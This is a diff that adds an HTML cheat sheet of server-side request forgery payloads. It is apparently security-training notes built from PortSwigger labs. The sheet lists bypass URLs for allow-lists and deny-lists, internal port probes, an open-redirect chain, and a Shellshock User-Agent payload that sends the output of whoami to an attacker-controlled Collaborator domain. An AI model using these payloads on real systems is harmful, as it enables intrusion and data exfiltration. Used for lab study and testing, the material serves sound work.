@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>SSRF</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="server-side-request-forgery-ssrf">Server-side Request Forgery
+(SSRF)</h1>
+<h2 id="summary">Summary</h2>
+<ul>
+<li><p><a href="#recon">Recon for SSRF</a></p></li>
+<li><p><a href="#cheat-sheet">Portswigger Labs Cheat Sheet /
+Payloads</a></p></li>
+</ul>
+<p><br></p>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><p>https://portswigger.net/web-security/ssrf</p></li>
+<li><p>https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery</p></li>
+</ul>
+<p><br></p>
+<h2 id="recon">Recon</h2>
+<h3 id="identify-ssrf">Identify SSRF</h3>
+<ul>
+<li><p>Identify any request parameters that appear to contain hostnames,
+IP addresses or full/partial URLs</p></li>
+<li><p>Modify each parameter’s value to specify another resource,
+similar to the one requested, and see if it appears in the
+response</p></li>
+<li><p>Try to specify a URL resource that you control out on the
+internet and monitor it for any connections. If no connections are
+received monitor the time taken for the application to respond, if there
+is a delay it could be a time-out connection due to network
+restrictions</p></li>
+</ul>
+<p><br></p>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p><strong>If we find an interesting parameter that contains hostnames,
+IP addresses or full URLs, the following payloads can help to identify
+SSRF:</strong></p>
+<p><br></p>
+<h3 id="access-control-bypass">Access Control Bypass</h3>
+<ul>
+<li><p>Use a localhost or valid internal IP address, through a SSRF
+vector, to potentially bypass access controls implemented on sensitive
+resources on the application that only allow access to admin users or
+through a specific IP address/network-interface:</p>
+<ul>
+<li>Examples:</li>
+</ul></li>
+</ul>
+<pre><code>http://localhost/admin</code></pre>
+<pre><code>http://192.168.0.5:8080/admin</code></pre>
+<p><br></p>
+<h3 id="resource-enumeration">Resource Enumeration</h3>
+<ul>
+<li><p>Change the parameter value to another resource and analyze how
+the application responds. We can probe for port numbers, internal IP
+addresses, different hostnames, and analyze the application’s
+responses.</p></li>
+<li><p>Ideally, we should know how the application responds to a valid
+vs invalid specified resources, so we can easily determine when an
+injected value is valid:</p>
+<ul>
+<li>Examples:</li>
+</ul></li>
+</ul>
+<pre><code>http://192.168.0.1:22</code></pre>
+<pre><code>http://192.168.0.1:8080</code></pre>
+<p><br></p>
+<h3 id="bypasses-for-disallow-list-filter">Bypasses for disallow-list
+filter</h3>
+<ul>
+<li><p>If the application is blocking requests for http://127.0.0.1 and
+/admin resources, we can try the following bypass techniques:</p></li>
+<li><p>Link:
+https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses</p></li>
+</ul>
+<h4 id="other-representations-for-127.0.0.1">Other representations for
+127.0.0.1:</h4>
+<pre><code>http://127.1</code></pre>
+<h4 id="url-encoding">URL Encoding:</h4>
+<pre><code>%68%74%74%70%3a%2f%2f%31%32%37%2e%31</code></pre>
+<h4 id="obfuscationcase-variation">Obfuscation/Case Variation:</h4>
+<pre><code>http://127.0.0.1/AdMiN</code></pre>
+<p><br></p>
+<h3 id="bypasses-for-allow-list-filter">Bypasses for allow-list
+filter</h3>
+<ul>
+<li>If the application is only checking that a specific host is
+somewhere within the parameter, we can bypass this restriction with the
+following payloads:</li>
+</ul>
+<h4 id="embed-credentials-in-a-url-before-hostname">Embed credentials @
+in a URL before hostname:</h4>
+<pre><code>https://expected-host@evil-host</code></pre>
+<h4 id="character-specifies-a-url-fragment"># character specifies a URL
+fragment:</h4>
+<pre><code>https://evil-host#expected-host</code></pre>
+<h4
+id="complex-method-to-bypass-allow-list-restrictions-try-to-encodedouble-encode-the-characters-too">Complex
+method to bypass allow list restrictions (try to encode/double-encode
+the #/@ characters too):</h4>
+<pre><code>https://evil-host#evil-host@expected-host/evil-path</code></pre>
+<pre><code>https://expected-host@evil-host/evil-path#</code></pre>
+<p><br></p>
+<h3 id="blind-ssrf">Blind SSRF</h3>
+<ul>
+<li><p>If the application does not return any notable differences in the
+responses from our SSRF payloads, then we can use Blind SSRF
+techniques:</p></li>
+<li><p>Inject a payload that will trigger an HTTP connection to a domain
+that you control and monitor for any network traffic.</p></li>
+<li><p>Inject this payload in all susceptible parameters and headers
+(Referer):</p>
+<ul>
+<li>Example: Referer: https://ATTACKER-SERVER</li>
+</ul></li>
+</ul>
+<p><br></p>
+<h3 id="ssrf-via-open-redirection">SSRF via Open Redirection</h3>
+<ul>
+<li><p>The goal here is to find both an Open Redirection and SSRF
+vulnerability. The SSRF vector may only allow webroot paths within the
+same target application. Inject the Open Redirection payload within the
+SSRF vector and identify how the application responds.</p></li>
+<li><p>Example:</p></li>
+<li><p>Open Redirection vulnerability, we can supply what ever value we
+want in the “path” parameter and it will reflect on the “Location” HTTP
+response header:</p></li>
+</ul>
+<pre><code>/product/nextProduct?currentProductId=1&amp;path=http://192.168.0.12:8080/admin</code></pre>
+<ul>
+<li>SSRF vulnerability via the “stockApi” parameter: (Note: URL encoding
+may be required for certain characters in the payload to process
+correctly.)</li>
+</ul>
+<pre><code>stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin</code></pre>
+<ul>
+<li>https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection</li>
+</ul>
+<p><br></p>
+<h3 id="blind-ssrf-with-shellshock-exploitation">Blind SSRF with
+Shellshock exploitation</h3>
+<ul>
+<li><p>The application is vulnerable to a SSRF vulnerability through the
+Referer header.</p></li>
+<li><p>The HTTP interaction contains the User-Agent String within the
+request.</p></li>
+<li><p>Payload (set this at the User-Agent header value of the HTTP
+request):</p>
+<ul>
+<li>User-Agent: () { :; }; /usr/bin/nslookup
+$(whoami).BURP-COLLABORATOR-SUBDOMAIN</li>
+</ul></li>
+<li><p>Enumerate an internal resource that the application can reach and
+place this payload in the Referer header.</p>
+<ul>
+<li>Example: Referer: 192.168.0.2:8080</li>
+</ul></li>
+<li><p>The ShellShock payload will be executed in the context of that
+internal resource and we’ll get the “user” (whoami) of the system sent
+to Burp Collaborator.</p></li>
+</ul>
+<p><br><br></p>
+<h3
+id="pending-to-complete-labs-that-are-missing-from-cheat-sheet">Pending
+to complete labs that are missing from cheat sheet:</h3>
+<ul>
+<li>All labs in this category are completed and referenced in cheat
+sheet.</li>
+</ul>
+</body>
+</html>
